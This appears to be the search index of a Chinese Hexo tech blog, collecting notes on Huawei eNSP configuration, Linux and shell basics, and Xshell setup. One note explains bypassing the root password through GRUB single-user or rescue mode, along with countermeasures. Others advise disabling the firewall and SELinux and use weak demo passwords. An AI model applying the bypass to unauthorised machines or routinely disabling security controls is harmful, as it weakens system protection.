<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ENSP</title>
    <url>/2024/06/17/ENSP/</url>
    <content><![CDATA[<h2 id="ENSP的基本配置"><a href="#ENSP的基本配置" class="headerlink" title="ENSP的基本配置"></a>ENSP的基本配置</h2><p>consle、telnet、vlan间通信、链路聚合</p>
<span id="more"></span>

<p><img src="/2024/06/17/ENSP/1de5159fb88f492a666a1976f5495f43.jpg"></p>
<p>123</p>
<p>system-view     &#x2F;&#x2F;进入系统视图</p>
<p>sysname R1        &#x2F;&#x2F;配置设备名为R1</p>
<p>interface g0&#x2F;0&#x2F;0 &#x2F;&#x2F;进入此端口</p>
<p>ip address 12.1.1.1 24 &#x2F;&#x2F;配置接口地址为此IP,掩码长度为24</p>
<p>quit                &#x2F;&#x2F;退出前一个视图模式</p>
<p>return            &#x2F;&#x2F;直接回到用户视图模式</p>
<p>save             &#x2F;&#x2F;保存设备配置</p>
<p>二、consle配置</p>
<p>[R1] user-interface console 0                &#x2F;&#x2F;进入console接口</p>
<p>idle-timeout 30                              &#x2F;&#x2F;配置用户连接的超时时间为30min</p>
<p>user privilege level 15                  &#x2F;&#x2F;配置用户界面的用户级别为15</p>
<p>authentication-mode password    &#x2F;&#x2F;配置用户认证方式为密码认证</p>
<p>set authentication password cipher huawei &#x2F;&#x2F;配置本地用户登录密码为huawei</p>
<p>authentication-mode aaa              &#x2F;&#x2F;配置用户认证方式为aaa认证</p>
<p>aaa                                             &#x2F;&#x2F;进入aaa模式</p>
<p>local-user admin password cipher huawei   &#x2F;&#x2F;配置本地用户登录用户名为admin 密码为huawei</p>
<p>三、telnet配置（与consle相似）</p>
<p>user-interface vty 0 4 &#x2F;&#x2F;进入远程配置 vty 0 到 4 的线程</p>
<p>四、VLAN配置</p>
<p>vlan 10               &#x2F;&#x2F;创建vlan10</p>
<p>vlan  batch  20 30  to   35               &#x2F;&#x2F;创建vlan 20 30 到 35 多个vlan</p>
<p>interface g0&#x2F;0&#x2F;1     &#x2F;&#x2F;进入此接口</p>
<p>[SW1-g0&#x2F;0&#x2F;1]    port    link-type   access   &#x2F;&#x2F;配置g0&#x2F;0&#x2F;1 为access模式</p>
<p>​                         port    default   vlan  10   &#x2F;&#x2F;配置g0&#x2F;0&#x2F;1属于vlan 10 </p>
<p>​                         port     trunk  allow-pass vlan 10  &#x2F;&#x2F;配置trunk链路放行vlan 10</p>
<p>​                         port     trunk  allow-pass vlan all  &#x2F;&#x2F;放行所有vlan</p>
<p>五、链路聚合</p>
<p>interface eth-trunk 0 &#x2F;&#x2F;进入聚合端口 0</p>
<p>mode lacp-static     &#x2F;&#x2F;配置聚合端口模式为LACP协商模式</p>
<p>trunkport g0&#x2F;0&#x2F;3 </p>
<p>trunkport g0&#x2F;0&#x2F;4 &#x2F;&#x2F;分别将这两个端口加入聚合链路  </p>
<p>mode  manual  load-balance  &#x2F;&#x2F;配置聚合端口模式为静态模式</p>
<p>load-balance           dst-ip   &#x2F;&#x2F;基于目的IP                           的负载</p>
<p>​                               dst-mac           &#x2F;&#x2F;基于目的mac            的负载</p>
<p>​                               src-dst-ip             &#x2F;&#x2F;基于源 目的ip</p>
<p>​                               src-dst-mac          &#x2F;&#x2F;基于源目的mac</p>
<p>​                               src-ip                  &#x2F;&#x2F;基于源ip</p>
<p>​                               src-mac            &#x2F;&#x2F;基于源mac</p>
<p>三、VLAN间通信</p>
<p>inter vlan 10            &#x2F;&#x2F;先创建vlan10</p>
<p>interface vlanif 10   &#x2F;&#x2F;进入 vlanif 10 接口</p>
<p>IP address   192.168.10.1 24 &#x2F;&#x2F;配置接口IP地址 掩码24位：相当于启用三层功能实现vlan通信</p>
<p>四、静态路由（边界路由器）与默认路由</p>
<p>[SW2] ip route-static 0.0.0.0 0.0.0.0 下一跳IP      &#x2F;&#x2F;配置默认路由</p>
<p>[R1] ip route-static 192.168.10.0 255.255.255.0 192.168.100.2 &#x2F;&#x2F;配置到达192.168.10.0的静态路由</p>
<p>[R1]ip route -static 192.168.10.0 255.255.255.0 192.168.100.2 perference 100&#x2F;&#x2F;配置到达10.0网段的静态路由优先级为100 （华为默认60）且越小越优先</p>
<p>​                            RIP协议相关配置</p>
<p>[R1] rip   1     &#x2F;&#x2F;配置RIP协议进程</p>
<p>[R1-rip-1]network 12.0.0.0     &#x2F;&#x2F;宣告12.0.0.0网段</p>
<p>[R1-rip-1]perference  100      &#x2F;&#x2F;修改路由优先级为100</p>
<p>[R1-rip-1]defalut-route originate cost 5   &#x2F;&#x2F;下发默认路由且cost值为5</p>
<p>[R1]acl 2000                         &#x2F;&#x2F;创建acl 2000</p>
<p>[R1-acl-basic-2000]rule deny source 10.1.1.0 0.0.0.255   &#x2F;&#x2F;对源地址段为10.1.1.0的路由过滤(反掩码)</p>
<p>[R1-acl-basic-2000]rule permit source 10.1.1.0 0.0.0.255   &#x2F;&#x2F;对源地址段为10.1.1.0的路由匹配</p>
<p>[R1-rip-1]filter-policy 2000 export   &#x2F;&#x2F;调用acl 2000的发布路由方向的过滤列表</p>
<p>​                         OSPF协议相关配置</p>
<p>[R1]ospf 1        &#x2F;&#x2F;配置ospf协议进程1</p>
<p>[R1-ospf-1]area 1   &#x2F;&#x2F;进入area 1区域</p>
<p>[R1-ospf-1-area-0.0.0.1]network 12.1.1.0 0.0.0.255 &#x2F;&#x2F;宣告12.1.1.0网段</p>
<p>[R1-ospf-1]perference 100    &#x2F;&#x2F;修改路由优先级为100</p>
<p>[R1-ospf-1]default-route-advertise always cost 5 &#x2F;&#x2F;必定下发默认路由器且cost值为5</p>
<p>[R2-OSPF-1-area-0.0.0.1]abr-summary 10.1.0.0 255.255.0.0  &#x2F;&#x2F;配置域内聚合路由10.1.0.0 掩码为255.255.0.0</p>
<p>[R2]acl 2000 &#x2F;&#x2F;配置acl</p>
<p>[R2-acl-basic-2000]rule deny source 10.1.1.0  0.0.0.255 &#x2F;&#x2F;对源地址为10.1.1.0的路由执行丢弃</p>
<p>[R2-OSPF-1]filter-policy 2000 import &#x2F;&#x2F;调用acl2000的接收路由方向的过滤列表</p>
<p>[R4-OSPF-AREA-0.0.0.2]stub  &#x2F;&#x2F;配置aera 2区域为stu区域4 R3同样需要配置</p>
<p>[R4-ospf-1]asbr-summary 100.1.0.0 255.255.0.0 &#x2F;&#x2F;配置外部聚合路由 10.1.0.0 掩码为255.255.0.0</p>
<p>​                ISIS</p>
<p>[HUAWEI]isis 1 &#x2F;&#x2F;配置ISIS进程 1</p>
<p>[R1-ISIS-1]networking-entity 49…….. &#x2F;&#x2F;配置地址</p>
<p>[]is-level level-1 &#x2F;&#x2F;配置路由器为level-1设备非骨干（其次为level-2[骨干]   level-1-2[ABR]…..）</p>
<p>[]preference 100 &#x2F;&#x2F;修改路由优先级为100</p>
<p>[]default-route-advertise always cost 5  &#x2F;&#x2F;必定下发默认路由器且cost值为5</p>
<p><u>区别于OSPF的是  ：必须注意 配置该路由模式时需进入端口下</u></p>
<p>[R1-G0&#x2F;0&#x2F;0]isis enable   &#x2F;&#x2F;在R1的接口G0&#x2F;0&#x2F;0下运行ISIS路由协议</p>
<p>[R1-ISIS-1]summary 10.1.0.0 255.255.0.0 &#x2F;&#x2F;配置聚合路由为10.1.0.0 255.255.0.0 </p>
<p>[R1]ACL 2000 &#x2F;&#x2F;创建ACL 2000</p>
<p>[R1-ACL-BASIC-2000]rule deny source 10.1.1.0 0.0.0.255 &#x2F;&#x2F;对源地址为10.1.1.0的路由执行丢弃</p>
<p>[R1-ISIS-1]fillter-policy 2000 import &#x2F;&#x2F;调用acl 2000的接收路由方向的过滤列表</p>
]]></content>
      <tags>
        <tag>ENSP</tag>
      </tags>
  </entry>
  <entry>
    <title>bash</title>
    <url>/2024/06/16/1/</url>
    <content><![CDATA[<h1 id="bash解释器特性"><a href="#bash解释器特性" class="headerlink" title="bash解释器特性"></a>bash解释器特性</h1><h4 id="1-命令和文件自动补全-注意：Tab只能补全命令和文件"><a href="#1-命令和文件自动补全-注意：Tab只能补全命令和文件" class="headerlink" title="1 命令和文件自动补全 注意：Tab只能补全命令和文件"></a>1 命令和文件自动补全 注意：Tab只能补全命令和文件</h4>]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 基础</title>
    <url>/2024/06/21/Linux-%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>day01 </p>
<span id="more"></span>

<p>1、程序的开发流程</p>
<p>  PM产品经理  需求分析 确认后进入开发阶段<br>$$<br>开发&#x3D;<br>\begin{cases}<br>ue 交互设计并审评\<br>ui 根据ue做设计\<br>FE 做页面开发前端开发(客户端：web界面，手机app，微信小程序) \<br>RD 技术方案，后端开发，定好接口规范\<br>QA 设计好测试用例&#x2F;评审\<br>OP 运维设计好整套系统的架构\<br>\end{cases}<br>$$<br>2、项目测试<br>$$<br>开发自测-提供bug给测试-产品第一次验收<br>$$<br>3、项目上阶段<br>$$<br>\left.<br>\begin{matrix}<br>1.上线计划填写\<br>2.上线准备工作\<br>3.上线\<br>\end{matrix}<br>\right}<br>-上线功能回测-产品第二次验收<br>$$</p>
<p>$$<br>运维主要内容<br>\begin{cases}<br>应用程序7<em>24</em>365不间断运行&#x3D;监控\<br>数据异地备份&#x3D;磁带，磁盘\<br>优化&#x3D;操作系统 计算机硬件 网络 安全\<br>\end{cases}<br>$$</p>
<p>行间公式$O(f(n))&#x3D;log_2^{n}$测试</p>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Xshell工具</title>
    <url>/2024/06/21/Xshell%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>day02</p>
<span id="more"></span>

<p>一、什么是xshell？<br>xshell是一个远程登录客户端程序，对应的服务端程序openssh-server（默认22）<br>二、为何要用xshell<br>远程管理<br>三、如何使用<br><a href="http://pan.baodi.com/s1NXnnQ1RsQ9RMcRMcWUb">http://pan.baodi.com/s1NXnnQ1RsQ9RMcRMcWUb</a><br>提取码 v3h5<br>下载安装后整体优化如下<br>$$<br>\begin{cases}<br>工具-选项-会话文件夹（指定一个文件夹）,便于管理\<br>工具-选项-更新-取消自动\<br>工具-选项-高级-终端-禁用铃声\<br>右键任务栏\<br>文件-属性-终端-缓冲区大小显示行数（shift+pgup&#x2F;pgdn翻页）\<br>终端-VT模式-普通\<br>高级-禁用更改终端标题\<br>\end{cases}<br>$$<br>四、远程连接排错<br>$$<br>\begin{cases}<br>1.测试网络是否畅通：ping 服务端ip\<br>2.是否被拦截：selinux，firewall防火墙<br>\begin{cases}<br>1.关闭防火墙\<br>systemctl stop firewalld\<br>systemctl disabled firewalld禁止开机自启动\<br>2.关闭selinux\<br>setenforce 1 # enforcing-加载并生效\<br>setenforce 0 # permissive-加载但不生效\<br>             # disabled-不加载\<br>vim &#x2F;etc&#x2F;sysconfig&#x2F;selinux #修改selinux&#x3D;disabeld\<br>查看selinux状态-getenforce\<br>systemctl restart sshd # 开启服务端程序<br>systemctl restart network # 重启服务<br>\end{cases}<br>\end{cases}<br>$$</p>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>centos</title>
    <url>/2024/06/23/centos/</url>
    <content><![CDATA[<h1 id="nginx安装使用"><a href="#nginx安装使用" class="headerlink" title="nginx安装使用"></a>nginx安装使用</h1><p>&#x2F;etc&#x2F;nginx<br>&#x2F;usr&#x2F;share&#x2F;nginx<br>&#x2F;usr&#x2F;lib64&#x2F;nginx<br>&#x2F;var&#x2F;lib&#x2F;nginx</p>
]]></content>
      <tags>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/06/16/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>shell基础</title>
    <url>/2024/06/21/shell%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="操作系统的启动流程"><a href="#操作系统的启动流程" class="headerlink" title="操作系统的启动流程"></a>操作系统的启动流程</h2><h3 id="安全优化"><a href="#安全优化" class="headerlink" title="安全优化"></a>安全优化</h3><p>$$<br>\begin{cases}<br>单用户模式 破解密码\<br>grub加密\<br>光盘修复模式&#x2F;救援模式 修复操作系统的问题\<br>BIOS加密\<br>\end{cases}<br>$$</p>
<span id="more"></span>

<h3 id="shell基础"><a href="#shell基础" class="headerlink" title="shell基础"></a>shell基础</h3><p>$$<br>\begin{cases}<br>介绍\<br>交互式环境\<br>命令语法\<br>bash解释器特性\<br>命令查找优先级\<br>查看帮助信息\<br>常用命令\<br>\end{cases}<br>$$</p>
<p>$$<br>文件处理相关命令<br>\begin{cases}<br>目录结构 单根结构\<br>系统目录注解（***）\<br>文件操作基础（增、删、改、查）\<br>查看文件内容、修改文件内容vim、查找文件find\<br>打包压缩、软硬连接<br>\字符处理命令<br>\begin{cases}<br>sort\<br>uniq\<br>cut\<br>tr\<br>wc\<br>\end{cases}<br>\路径<br>\begin{cases}<br>相对路径\<br>绝对路径\<br>\end{cases}<br>\end{cases}<br>$$</p>
<h2 id="二、操作系统启动流程"><a href="#二、操作系统启动流程" class="headerlink" title="二、操作系统启动流程"></a>二、操作系统启动流程</h2><p>加电<br>启动BIOS，检测启动项目<br>读取启动盘第一个扇区512bytes，包含是mbr主引导记录（446引导程序bootloader-grub）<br>grub启动<br>加载内核<br>$$<br>读取运行级别<br>\begin{cases}<br>0-关机\<br>1-单用户工作，不需要账号密码进入后就是管理员账号，用于系统维护，禁止远程登录\<br>2-多用户状态（没有NFS），没有网络\<br>3-完全多用户（有NFS）登录后进入控制台\<br>4-系统未使用，保留\<br>5-图形GUI模式\<br>6-重启\<br>\end{cases}<br>$$<br>centos7启动的第一个程序systemd，pid-0，启动其他服务</p>
<h3 id="三、系统密码破解"><a href="#三、系统密码破解" class="headerlink" title="三、系统密码破解"></a>三、系统密码破解</h3><p>1.重启<br>切换第一个模式，并按E（dit）,编辑<br>进入最底层，找到ro rhgb……修改为：\ rw\ init&#x3D;&#x2F;sysroot&#x2F;bin&#x2F;sh<br>按CTRL-X进入单用户模式<br>执行chroot\ &#x2F;sysroot&#x2F;<br>passwd\ root回车输入密码<br>一定要再输入：<br>$$<br>vim\ &#x2F;etc&#x2F;sysconfig&#x2F;selinux<br>$$<br>把selinux修改为disabled#关闭模式<br>2.为了防止其他人进行修改，可以在对grub进行一次加密<br>$$<br>1.执行grub2-setpassword\ 命令\<br>#\ grub2-setpassword\<br>enter\ password<em><strong>\<br>confirm\ password</strong></em>\<br>2.在打开文件&#x2F;boot&#x2F;grub2&#x2F;grub.cfg，找到menuentray开头。找到条目后删除–unrestricted参数\<br>3.reboot重启验证，只有输入账号密码后，才能进入grub菜单修改管理密码<br>$$<br>3.BIOS加密，光盘修复<br>$$<br>\begin{cases}<br>#1、进入bios，从光盘启动\<br>#2、点击troubleshooting\<br>#3、进入界面\ 选择：rescue\ a\ centos\ Linux\ system\<br>#4、进入到rescue选项\ 按enter键\ 选1，其余选项为<br>\begin{cases}<br>1.continue：救援模式程序会自动查找系统中已有的文件系统，并可读写挂载到&#x2F;mnt&#x2F;sysimage目录\<br>2.read-only：会以只读的方式挂载已有的文件系统\<br>3.skip\ to\ sheell：手动挂载\<br>\end{cases}<br>\#5、sh切换bash模式\<br>chroot\ &#x2F;mnt&#x2F;sysimage\<br>#6、执行命令\<br>passwd\ root<br>\end{cases}<br>$$<br>4.扣主板bios电池，锁机柜</p>
<h2 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h2><h5 id="1、什么是系统命令"><a href="#1、什么是系统命令" class="headerlink" title="1、什么是系统命令"></a>1、什么是系统命令</h5><p>shell解释器对系统接口的封装结果<br>系统命令&#x2F;shell命令-shell解释器-系统接口-内核-硬件</p>
<h5 id="2、为何要用系统命令"><a href="#2、为何要用系统命令" class="headerlink" title="2、为何要用系统命令"></a>2、为何要用系统命令</h5><p>为了使用计算机</p>
<h5 id="3、补充"><a href="#3、补充" class="headerlink" title="3、补充"></a>3、补充</h5><p>第一层意思：shell代表的是解释器，是对系统接口的封装，即在系统接口外又加了一层壳，shell只是一种称呼，而bash解释器才是具体的一种shell<br>第二层意思：shell这门编程预言（一堆命令及语法）</p>
<h5 id="4、-posix（了解）"><a href="#4、-posix（了解）" class="headerlink" title="4、 posix（了解）"></a>4、 posix（了解）</h5><p>posix全称可移植的操作系统接口，posix是一种规范</p>
<h5 id="5、shell交互式环境"><a href="#5、shell交互式环境" class="headerlink" title="5、shell交互式环境"></a>5、shell交互式环境</h5><p>&#x2F;#-超级管理员用户<br>￥-普通用户提示符<br>~-当前用户的个人文件夹-家目录<br>$$<br>useradd\ egon&#x2F;&#x2F;创建用户\<br>passwd\ egon&#x2F;&#x2F;交互式设置密码\<br>echo\ “123”\ |\ passwd\ –stdin\ egon&#x2F;&#x2F;非交互式\<br>$$</p>
<h5 id="6、shell命令的语法格式"><a href="#6、shell命令的语法格式" class="headerlink" title="6、shell命令的语法格式"></a>6、shell命令的语法格式</h5><p>命令：就是一个单词，对应着一个功能&#x2F;程序，运行一条命令就启动一个进程<br>选项：对命令的描述，控制命令的具体运行<br>参数：命令的操作对象<br>ps：硬盘知识补充<br>        硬盘-》水桶<br>        分区-》水桶的隔断<br>        挂载点&#x2F;文件夹-》某一个具体的隔断</p>
<h5 id="7、开始编写shell脚本程序"><a href="#7、开始编写shell脚本程序" class="headerlink" title="7、开始编写shell脚本程序"></a>7、开始编写shell脚本程序</h5><p>先切换到root用户，创建文件，后缀名没有硬性限制，通常以.sh结尾</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@egon ~~]# mkdir -p /a/b</span><br><span class="line">[root@egon ~~]# vim /a/b/hello.sh</span><br><span class="line">[root@egon ~~]# cat /a/b/hello.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一个shell小程序</span></span><br><span class="line">echo &quot;hello world!&quot;</span><br></pre></td></tr></table></figure>

<p>1.第一行表示我们选择使用的shell解释器是bash，也可以用：#!&#x2F;usr&#x2F;bin&#x2F;env bash  此外shell的第一行比较特殊，一般以#！开始来指定使用的shell解释的类型<br>2.第二行以#开始，表示本行是注释，注释是对代码的解释说明<br>3.第三行中的echo是Linux中的输出命令</p>
<h5 id="8、运行shell脚本程序"><a href="#8、运行shell脚本程序" class="headerlink" title="8、运行shell脚本程序"></a>8、运行shell脚本程序</h5><p>运行方式也存在几种</p>
<h6 id="1-绝对路径"><a href="#1-绝对路径" class="headerlink" title="1.绝对路径"></a>1.绝对路径</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">权限：</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1，对沿途文件夹有x权限</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2，对目标文件有r和x权限</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">例</span></span><br><span class="line">[root@egon ~~]# ll -d /a</span><br><span class="line">d--------x. 3 root root 15 11月 15 11:05 /a</span><br><span class="line">[root@egon ~~]# ll -d /a/b</span><br><span class="line">d--------x. 2 root root 18 11月 15 11:06 /a/b</span><br><span class="line">[root@egon ~~]# ll /a/b/hello.sh</span><br><span class="line">-rw-r--r-x. 1 root root 10 11月 15 11:06 /a/b/hello.sh</span><br><span class="line">[root@egon ~~]# su -egon</span><br><span class="line">[egon@egon ~~]$ /a/b/hello.sh</span><br><span class="line">hello world!</span><br><span class="line">[egon@egon ~~]$ </span><br></pre></td></tr></table></figure>

<h6 id="2-相对路径"><a href="#2-相对路径" class="headerlink" title="2.相对路径"></a>2.相对路径</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">权限：</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1，对沿途文件夹有x权限</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2.对目标文件有r和x权限</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">例</span></span><br><span class="line">[root@egon ~~]# ll -d /a</span><br><span class="line">d--------x. 3 root root 15 11月 15 11:05 /a</span><br><span class="line">[root@egon ~~]# ll -d /a/b</span><br><span class="line">d--------x. 2 root root 18 11月 15 11:06 /a/b</span><br><span class="line">[root@egon ~~]# ll /a/b/hello.sh</span><br><span class="line">-rw-r--r-x. 1 root root 10 11月 15 11:06 /a/b/hello.sh</span><br><span class="line">[root@egon ~~]# su -egon</span><br><span class="line">[egon@egon ~~]$ /a/b/hello.sh #绝对路径的方式</span><br><span class="line">hello world!</span><br><span class="line">[egon@egon ~~]$ cd /a</span><br><span class="line">[egon@egon /a/a]$ ./b/hello.sh #相对路径的方式，加./作为前缀</span><br><span class="line">hello world!</span><br><span class="line">[egon@egon /a/a]$</span><br></pre></td></tr></table></figure>

<h6 id="3-解释器-文件路径（两种路径都可以）"><a href="#3-解释器-文件路径（两种路径都可以）" class="headerlink" title="3.解释器+文件路径（两种路径都可以）"></a>3.解释器+文件路径（两种路径都可以）</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">权限：</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1，对沿途文件夹有x权限</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2. 对目标文件有r权限就可以</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">因为我们执行的是解释器，当前用户对解释有执行权限就可以了，这个权限默认就有，而解释器需要读文件内容来执行，所以需要对目标文件有r权限</span></span><br><span class="line">[root@egon ~~]# chmod -R o=x /a</span><br><span class="line">[root@egon ~~]# chmod o=r /a/b/hello.sh</span><br><span class="line">[root@egon ~~]# su -egon</span><br><span class="line">[egon@egon ~~]$ cd /a</span><br><span class="line">[egon@egon /a/a]$ bash b/hello.sh</span><br><span class="line">hello world!</span><br><span class="line">[egon@egon /a/a]$</span><br></pre></td></tr></table></figure>

<h6 id="4-上述三种方式都是在子shell进程中执行程序，而方式四则是在当前shell进程中执行"><a href="#4-上述三种方式都是在子shell进程中执行程序，而方式四则是在当前shell进程中执行" class="headerlink" title="4.上述三种方式都是在子shell进程中执行程序，而方式四则是在当前shell进程中执行"></a>4.上述三种方式都是在子shell进程中执行程序，而方式四则是在当前shell进程中执行</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例如</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">上述三种方式都是在当前shell环境下开启了一个新的shell解释器环境/子shell来执行程序，脚本程序在子shell中运行完毕后，子shell环境随即关闭，然后返回到父级shell即当前shell环境中，如果就想在当前shell环境中执行,需要这么做</span></span><br><span class="line">[egon@localhost shell]$ cd /home/egon/shell/</span><br><span class="line">[egon@localhost shell]$ ll hello.sh # 当前用户egon对该文件没有执行权限</span><br><span class="line">-rw-r--r--. 1 root root 60 8月 14 18:33 hello.sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下面两种方式都一样</span></span><br><span class="line">[root@egon ~~]# chmod -R o=x /a</span><br><span class="line">[root@egon ~~]# chmod o=r /a/b/hello.sh</span><br><span class="line">[root@egon ~~]# su - egon</span><br><span class="line">[egon@egon ~~]$ . /a/b/hello.sh # . 后跟空格，然后再跟绝对路径</span><br><span class="line">hello world!</span><br><span class="line">[egon@egon ~~]$ cd /a/b/</span><br><span class="line">[egon@egon /a/b/a/b]$ . hello.sh # . 后跟空格，然后再跟相对路径</span><br><span class="line">hello world!</span><br><span class="line">[egon@egon /a/b/a/b]$ source hello.sh # 跟上述方式一样</span><br><span class="line">hello world!</span><br></pre></td></tr></table></figure>

<p>在当前shell解释器进程中执行脚本与在子shell进程中执行脚本的区别在于作用域</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一个shell环境就是一个单独的全局作用域，不同的shell环境，无法访问彼此shell环境中的变量</span></span><br><span class="line">[root@egon ~~]# su - egon</span><br><span class="line">[egon@localhost ~]$ x=111</span><br><span class="line">[egon@localhost ~]$ cat /a/b/hello.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo &quot;hello world!&quot;</span><br><span class="line">echo $x # 我们在这里访问一下全局变量x</span><br><span class="line">[egon@localhost ~]$ source /a/b/hello.sh # 在当前shell环境执行，可以访问到x</span><br><span class="line">hello world!</span><br><span class="line">111 # 取到了x的值</span><br><span class="line">[egon@localhost ~]$ bash /a/b/hello.sh # 在子shell环境执行，不能访问到x</span><br><span class="line">hello world!</span><br><span class="line">    # 此处打印空</span><br></pre></td></tr></table></figure>

<h5 id="9、调试shell程序"><a href="#9、调试shell程序" class="headerlink" title="9、调试shell程序"></a>9、调试shell程序</h5><h6 id="方法一、以调试的方式运行"><a href="#方法一、以调试的方式运行" class="headerlink" title="方法一、以调试的方式运行"></a>方法一、以调试的方式运行</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@egon test]# sh -vx login.sh #不加-v选项，只会显示程序中运行的代码，不会显示注释信息</span><br></pre></td></tr></table></figure>

<h6 id="方法二、只调试语法是否有问题，比如if判断少了结尾"><a href="#方法二、只调试语法是否有问题，比如if判断少了结尾" class="headerlink" title="方法二、只调试语法是否有问题，比如if判断少了结尾"></a>方法二、只调试语法是否有问题，比如if判断少了结尾</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@egon test]# sh -n login.sh </span><br></pre></td></tr></table></figure>

<h6 id="方法三、仅调试脚本的一部分，用set-x-与set-x包含，运行过程中会只打印它们包含的代码段的运行情况"><a href="#方法三、仅调试脚本的一部分，用set-x-与set-x包含，运行过程中会只打印它们包含的代码段的运行情况" class="headerlink" title="方法三、仅调试脚本的一部分，用set -x 与set +x包含，运行过程中会只打印它们包含的代码段的运行情况"></a>方法三、仅调试脚本的一部分，用set -x 与set +x包含，运行过程中会只打印它们包含的代码段的运行情况</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@egon test]# cat login.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/env bash</span></span><br><span class="line">set -x</span><br><span class="line">read -p &quot;请输入您的名字: &quot; name</span><br><span class="line">read -p &quot;请输入您的密码: &quot; pwd</span><br><span class="line">set +x</span><br><span class="line">if [[ &quot;$name&quot; == &quot;egon&quot; &amp;&amp; &quot;$pwd&quot; == &quot;123&quot; ]];then #中括号两端需要留有空格</span><br><span class="line">echo &quot;登录成功&quot;</span><br><span class="line">else</span><br><span class="line">echo &quot;账号或密码错误&quot;</span><br><span class="line">fi</span><br><span class="line">[root@egon test]# . login.s</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>友链</title>
    <url>/2024/06/17/%E5%8F%8B%E9%93%BE/</url>
    <content><![CDATA[<h1 id="基于next主题下如何添加友链以及修改左侧任务栏和菜单栏的图标、文字的颜色"><a href="#基于next主题下如何添加友链以及修改左侧任务栏和菜单栏的图标、文字的颜色" class="headerlink" title="基于next主题下如何添加友链以及修改左侧任务栏和菜单栏的图标、文字的颜色"></a>基于next主题下如何添加友链以及修改左侧任务栏和菜单栏的图标、文字的颜色</h1><span id="more"></span>

<p>E:\BOKE\hexo_blog\source\links\index.md</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;ava&quot;</span> <span class="attr">src</span>=<span class="string">&quot;头像&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card-header&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">         <span 